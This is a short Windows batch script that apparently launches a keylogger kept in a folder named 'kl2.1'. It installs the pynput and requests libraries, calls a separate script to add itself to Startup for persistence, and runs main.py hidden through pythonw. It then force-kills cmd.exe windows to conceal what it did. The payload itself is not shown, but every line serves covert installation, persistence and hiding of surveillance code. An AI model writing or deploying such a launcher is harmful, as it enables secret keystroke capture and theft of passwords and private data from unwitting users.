@echo off

cd C:\users\%USERNAME%\kl2.1

pip install requests
pip install pynput

:: Run autostart.bat to add run.bat to Startup
call autostart.bat

pythonw main.py
for /f "tokens=1" %%i in ('tasklist ^| findstr cmd.exe') do (
    if not "%%i" == "python.exe" taskkill /F /IM %%i
)
exit
